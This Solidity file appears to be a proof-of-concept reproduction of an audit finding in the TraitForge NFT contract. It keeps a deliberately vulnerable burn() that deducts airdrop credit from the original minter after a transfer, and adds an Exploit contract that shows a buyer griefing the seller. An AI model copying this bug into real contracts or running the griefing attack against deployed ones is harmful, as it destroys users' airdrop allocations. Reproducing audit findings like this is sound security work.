// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    TraitForge — [H-02] Griefing attack on seller's airdrop benefits
    (AvantGard, Code4rena 2024-07-traitforge, finding #37916)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.

    Root cause: minting records `initialOwners[tokenId] = to` and credits
    airdrop entropy to that address. On burn/nuke the contract always does
      airdropContract.subUserAmount(initialOwners[tokenId], entropy);
    Transfer/sale does NOT migrate airdrop credit to the new owner. A buyer
    (or any subsequent holder) can burn/nuke the NFT and permanently slash
    the original minter's airdrop allocation — griefing the seller after they
    already sold.

    Vulnerable burn() body is preserved (@> VULN on subUserAmount of
    initialOwners). ERC721 reduced to ownership + transfer + burn.
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal airdrop ledger (addUserAmount / subUserAmount / userInfo).
contract Airdrop {
    bool public started;
    mapping(address => uint256) public userInfo;
    uint256 public totalValue;

    function airdropStarted() external view returns (bool) {
        return started;
    }

    function addUserAmount(address user, uint256 amount) external {
        require(!started, "Already started");
        userInfo[user] += amount;
        totalValue += amount;
    }

    function subUserAmount(address user, uint256 amount) external {
        require(!started, "Already started");
        require(userInfo[user] >= amount, "Invalid amount");
        userInfo[user] -= amount;
        totalValue -= amount;
    }
}

/// @notice Reduced TraitForgeNft: mint credits airdrop to initialOwner;
///         burn always subtracts from initialOwners[tokenId] even after transfer.
contract TraitForgeNft {
    Airdrop public airdropContract;

    mapping(uint256 => address) public initialOwners;
    mapping(uint256 => uint256) public tokenEntropy;
    mapping(uint256 => address) public ownerOf;
    uint256 private _tokenIds;

    constructor(Airdrop _airdrop) {
        airdropContract = _airdrop;
    }

    /// @dev Mirrors _mintInternal: assign initialOwner + airdrop credit.
    function mint(address to, uint256 entropyValue) external returns (uint256) {
        _tokenIds++;
        uint256 newItemId = _tokenIds;
        ownerOf[newItemId] = to;
        tokenEntropy[newItemId] = entropyValue;
        initialOwners[newItemId] = to; // verbatim semantics

        if (!airdropContract.airdropStarted()) {
            airdropContract.addUserAmount(to, entropyValue);
        }
        return newItemId;
    }

    function transfer(address to, uint256 tokenId) external {
        require(ownerOf[tokenId] == msg.sender, "not owner");
        ownerOf[tokenId] = to;
        // NOTE: initialOwners[tokenId] is intentionally NOT updated (the bug surface)
    }

    /// @notice Verbatim burn airdrop-subtraction from TraitForgeNft.burn
    function burn(uint256 tokenId) external {
        require(ownerOf[tokenId] == msg.sender, "ERC721: caller is not token owner or approved");
        if (!airdropContract.airdropStarted()) {
            uint256 entropy = tokenEntropy[tokenId]; // getTokenEntropy
            // FIX: skip subUserAmount when msg.sender != initialOwners[tokenId] (or when caller is NukeFund)
            airdropContract.subUserAmount(initialOwners[tokenId], entropy); // @> VULN: subtracts from ORIGINAL minter after transfer
        }
        delete ownerOf[tokenId];
        delete tokenEntropy[tokenId];
    }
}

/// @dev Holds the NFT as the seller and transfers it out after sale.
contract SellerActor {
    TraitForgeNft public nft;

    constructor(TraitForgeNft _nft) {
        nft = _nft;
    }

    function transferOut(address to, uint256 tokenId) external {
        nft.transfer(to, tokenId);
    }
}

/// @dev Holds the NFT as the griefing buyer and burns it.
contract BuyerActor {
    TraitForgeNft public nft;

    constructor(TraitForgeNft _nft) {
        nft = _nft;
    }

    function griefBurn(uint256 tokenId) external {
        nft.burn(tokenId);
    }
}

/// @notice Seller mints → sells to griefing buyer → buyer burns → seller's
///         airdrop allocation is slashed while buyer paid nothing extra.
contract Exploit {
    Airdrop public airdrop; // CREATE nonce 1
    TraitForgeNft public nft; // CREATE nonce 2
    SellerActor public seller; // CREATE nonce 3
    BuyerActor public buyer; // CREATE nonce 4

    uint256 public constant ENTROPY = 1000;

    constructor() {
        airdrop = new Airdrop(); // 1
        nft = new TraitForgeNft(airdrop); // 2
        seller = new SellerActor(nft); // 3
        buyer = new BuyerActor(nft); // 4
    }

    function run() external {
        // Seller mints an entity → airdrop credit = ENTROPY to seller actor.
        uint256 tokenId = nft.mint(address(seller), ENTROPY);
        require(airdrop.userInfo(address(seller)) == ENTROPY, "seller airdrop not seeded");
        require(nft.initialOwners(tokenId) == address(seller), "initial owner wrong");

        // Seller transfers/sells the NFT to BUYER. Airdrop credit stays with seller.
        seller.transferOut(address(buyer), tokenId);
        require(nft.ownerOf(tokenId) == address(buyer), "transfer failed");
        require(airdrop.userInfo(address(seller)) == ENTROPY, "transfer must not touch airdrop");

        // Griefing: BUYER burns/nukes the token → SELLER's airdrop is slashed.
        buyer.griefBurn(tokenId);

        // HARM: seller's airdrop benefits reduced to 0 by a party who never minted.
        require(airdrop.userInfo(address(seller)) == 0, "harm: seller airdrop not slashed");
        require(airdrop.totalValue() == 0, "total airdrop value should be zero");
    }
}
